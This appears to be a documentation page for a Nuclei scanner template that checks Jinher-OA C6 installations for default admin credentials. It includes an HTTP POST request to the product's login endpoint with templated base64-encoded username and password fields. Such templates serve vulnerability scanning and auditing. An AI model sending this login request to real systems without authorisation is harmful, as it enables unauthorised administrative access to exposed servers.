# Nuclei Template: Jinher-OA C6 - Default Admin Discovery
**Template ID:** jinher-oa-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`jinher-oa-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Jinher-OA C6 default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /c6/Jhsoft.Web.login/AjaxForLogin.aspx HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

type=login&loginCode={{base64("{{username}}")}}&pwd={{base64("{{password}}")}}&
```

## References
- https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md
